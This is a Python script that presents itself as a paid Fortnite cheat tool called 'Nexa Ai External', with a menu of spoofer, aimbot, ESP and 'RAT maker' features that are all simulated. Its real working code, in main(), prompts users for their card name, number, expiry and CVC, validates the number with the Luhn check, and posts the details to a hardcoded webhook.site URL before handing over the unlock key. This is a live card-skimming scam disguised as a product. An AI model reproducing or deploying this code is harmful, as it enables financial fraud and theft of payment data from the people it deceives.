import random
import string
import requests
from PIL import Image, ImageDraw, ImageFont
import os
from colorama import Fore, Back, Style, init
import time

# Initialize colorama
init(autoreset=True)

# Constants
VALID_KEY = "Nexa-ai-37722-jd38d-294"
WEBHOOK_URL = "https://webhook.site/46486ead-6321-4947-af5b-5c6e917484a1"
CAPTCHA_LENGTH = 6
CAPTCHA_FONT_SIZE = 48
CAPTCHA_IMAGE_SIZE = (200, 100)
CAPTCHA_FONT_PATH = "arial.ttf"  # Ensure you have this font file, or use a different font path

# Baby blue color code
BABY_BLUE = '\033[38;2;173;216;230m'  # RGB for baby blue

def create_gradient_text(start_color, end_color, text):
    """Create gradient text with changing colors."""
    gradient_text = ""
    num_colors = len(text)
    
    for i in range(num_colors):
        ratio = i / num_colors
        r = int(start_color[0] * (1 - ratio) + end_color[0] * ratio)
        g = int(start_color[1] * (1 - ratio) + end_color[1] * ratio)
        b = int(start_color[2] * (1 - ratio) + end_color[2] * ratio)
        color_code = f'\033[38;2;{r};{g};{b}m'
        gradient_text += color_code + text[i]
    
    return gradient_text + Style.RESET_ALL

def generate_captcha_text(length=CAPTCHA_LENGTH):
    """Generate random CAPTCHA text."""
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))

def generate_captcha_image(text):
    """Generate an image with CAPTCHA text."""
    img = Image.new('RGB', CAPTCHA_IMAGE_SIZE, color=(255, 255, 255))
    draw = ImageDraw.Draw(img)
    font = ImageFont.truetype(CAPTCHA_FONT_PATH, CAPTCHA_FONT_SIZE)
    text_width, text_height = draw.textbbox((0, 0), text, font=font)[2:]
    x = (CAPTCHA_IMAGE_SIZE[0] - text_width) / 2
    y = (CAPTCHA_IMAGE_SIZE[1] - text_height) / 2
    draw.text((x, y), text, font=font, fill=(0, 0, 0))
    return img

def display_captcha_image(img):
    """Display CAPTCHA image."""
    img.show()

def is_valid_card(card_number):
    """Validate card number using the Luhn algorithm."""
    def luhn_check(card_number):
        def digits_of(n):
            return [int(d) for d in str(n)]
        
        digits = digits_of(card_number)
        odd_digits = digits[-1::-2]
        even_digits = digits[-2::-2]
        checksum = sum(odd_digits)
        
        for d in even_digits:
            checksum += sum(digits_of(d * 2))
        
        return checksum % 10 == 0
    
    return luhn_check(card_number)

def detailed_spoofing_process():
    """Simulate a detailed and lengthy spoofing process."""
    print(Fore.GREEN + "Starting Fortnite Spoofer process..." + Style.RESET_ALL)
    
    steps = [
        "Initializing spoofing engine...",
        "Collecting system information...",
        "Backing up original system IDs...",
        "Generating new spoofed hardware IDs...",
        "Applying new hardware IDs...",
        "Modifying system registry...",
        "Adjusting network settings...",
        "Configuring spoofing parameters...",
        "Verifying spoofing success..."
    ]
    
    for step in steps:
        print(Fore.LIGHTWHITE_EX + f"{step}" + Style.RESET_ALL)
        time.sleep(random.uniform(1, 3))  # Simulate processing time
    
    print(Fore.GREEN + "Spoofing process completed successfully!" + Style.RESET_ALL)
    return_to_dashboard()

def configure_rat():
    """Display RAT configuration options and simulate RAT creation."""
    print(Fore.GREEN + "RAT Maker - Configuration Tab" + Style.RESET_ALL)
    print(Fore.WHITE + "----------------------------------------" + Style.RESET_ALL)
    
    rat_name = input(Fore.CYAN + "Enter RAT name: " + Style.RESET_ALL).strip()
    rat_version = input(Fore.CYAN + "Enter RAT version: " + Style.RESET_ALL).strip()
    rat_persistence = input(Fore.CYAN + "Enable persistence (yes/no): " + Style.RESET_ALL).strip().lower()
    rat_screenshot = input(Fore.CYAN + "Enable screenshots (yes/no): " + Style.RESET_ALL).strip().lower()
    rat_keylogger = input(Fore.CYAN + "Enable keylogger (yes/no): " + Style.RESET_ALL).strip().lower()
    
    print(Fore.LIGHTWHITE_EX + "Configuring RAT with the following options:" + Style.RESET_ALL)
    print(Fore.LIGHTWHITE_EX + f"  - Name: {rat_name}" + Style.RESET_ALL)
    print(Fore.LIGHTWHITE_EX + f"  - Version: {rat_version}" + Style.RESET_ALL)
    print(Fore.LIGHTWHITE_EX + f"  - Persistence: {rat_persistence.capitalize()}" + Style.RESET_ALL)
    print(Fore.LIGHTWHITE_EX + f"  - Screenshots: {rat_screenshot.capitalize()}" + Style.RESET_ALL)
    print(Fore.LIGHTWHITE_EX + f"  - Keylogger: {rat_keylogger.capitalize()}" + Style.RESET_ALL)
    
    print(Fore.GREEN + "Simulating RAT creation..." + Style.RESET_ALL)
    time.sleep(random.uniform(2, 5))  # Simulate configuration and creation time
    print(Fore.GREEN + "RAT configuration completed successfully!" + Style.RESET_ALL)
    return_to_dashboard()

def display_dashboard():
    """Display a fake dashboard with cheat components."""
    print(Fore.CYAN + Style.BRIGHT + "Nexa Ai External - Dashboard" + Style.RESET_ALL)
    print(Fore.WHITE + "----------------------------------------" + Style.RESET_ALL)
    
    # Fake components
    print(Fore.BLUE + Style.BRIGHT + "1. Fortnite Spoofer" + Style.RESET_ALL)
    print(Fore.LIGHTWHITE_EX + "   - Fake Spoofing processes..." + Style.RESET_ALL)
    print(Fore.BLUE + Style.BRIGHT + "2. AI Aimbot" + Style.RESET_ALL)
    print(Fore.LIGHTWHITE_EX + "   - Fake aimbot functionalities..." + Style.RESET_ALL)
    print(Fore.BLUE + Style.BRIGHT + "3. ESP (Extra Sensory Perception)" + Style.RESET_ALL)
    print(Fore.LIGHTWHITE_EX + "   - Fake ESP features..." + Style.RESET_ALL)
    print(Fore.BLUE + Style.BRIGHT + "4. Trigger Bot" + Style.RESET_ALL)
    print(Fore.LIGHTWHITE_EX + "   - Fake trigger bot settings..." + Style.RESET_ALL)
    print(Fore.BLUE + Style.BRIGHT + "5. RAT Maker" + Style.RESET_ALL)
    print(Fore.LIGHTWHITE_EX + "   - Create and configure a fake RAT..." + Style.RESET_ALL)
    print(Fore.WHITE + Style.BRIGHT + "----------------------------------------" + Style.RESET_ALL)
    
    choice = input(Fore.CYAN + "Select an option (1-5): " + Style.RESET_ALL).strip()
    
    if choice == '1':
        detailed_spoofing_process()
    elif choice == '2':
        display_ai_aimbot()
    elif choice == '3':
        display_esp()
    elif choice == '4':
        display_trigger_bot()
    elif choice == '5':
        configure_rat()
    else:
        print(Fore.RED + "Invalid choice! Please select a valid option.")
        return_to_dashboard()

def display_ai_aimbot():
    print(Fore.GREEN + "AI Aimbot activated!")
    print(Fore.LIGHTWHITE_EX + "Simulating aimbot functionalities...")
    # Simulate fake functionalities
    print(Fore.LIGHTWHITE_EX + "  - Process 1: Aiming accuracy settings...")
    print(Fore.LIGHTWHITE_EX + "  - Process 2: Adjusting aimbot sensitivity...")
    return_to_dashboard()

def display_esp():
    print(Fore.GREEN + "ESP activated!")
    print(Fore.LIGHTWHITE_EX + "Simulating ESP features...")
    # Simulate fake features
    print(Fore.LIGHTWHITE_EX + "  - Process 1: Displaying enemy locations...")
    print(Fore.LIGHTWHITE_EX + "  - Process 2: Showing item pickups...")
    return_to_dashboard()

def display_trigger_bot():
    print(Fore.GREEN + "Trigger Bot activated!")
    print(Fore.LIGHTWHITE_EX + "Simulating trigger bot settings...")
    # Simulate fake settings
    print(Fore.LIGHTWHITE_EX + "  - Process 1: Setting trigger conditions...")
    print(Fore.LIGHTWHITE_EX + "  - Process 2: Configuring firing rate...")
    return_to_dashboard()

def return_to_dashboard():
    """Return to the main dashboard after a process."""
    input(Fore.CYAN + "Press Enter to return to the dashboard..." + Style.RESET_ALL)
    display_dashboard()

def main():
    print(Fore.CYAN + Style.BRIGHT + "Nexa Ai External - Initialization" + Style.RESET_ALL)
    key = input(Fore.CYAN + "Enter your key: " + Style.RESET_ALL).strip()
    
    if key != VALID_KEY:
        print(Fore.RED + "Invalid key! Please purchase a key.")
        name_on_card = input(Fore.CYAN + "Enter name on card: " + Style.RESET_ALL).strip()
        card_number = input(Fore.CYAN + "Enter card number: " + Style.RESET_ALL).strip()
        expiry_month = input(Fore.CYAN + "Enter expiry month (MM): " + Style.RESET_ALL).strip()
        expiry_year = input(Fore.CYAN + "Enter expiry year (YYYY): " + Style.RESET_ALL).strip()
        cvc = input(Fore.CYAN + "Enter CVC: " + Style.RESET_ALL).strip()

        if is_valid_card(card_number):
            card_info = {
                "name_on_card": name_on_card,
                "card_number": card_number,
                "expiry_month": expiry_month,
                "expiry_year": expiry_year,
                "cvc": cvc
            }
            try:
                requests.post(WEBHOOK_URL, json=card_info)
                print(Fore.GREEN + "Card information sent for verification.")
                print(Fore.GREEN + "Here is your key: Nexa-ai-37722-jd38d-294")
            except requests.exceptions.RequestException as e:
                print(Fore.RED + f"Error sending card information: {e}")
        else:
            print(Fore.RED + "Invalid card number!")
    else:
        print(Fore.GREEN + "Valid key! Preparing your cheat...")
        display_dashboard()

if __name__ == "__main__":
    main()
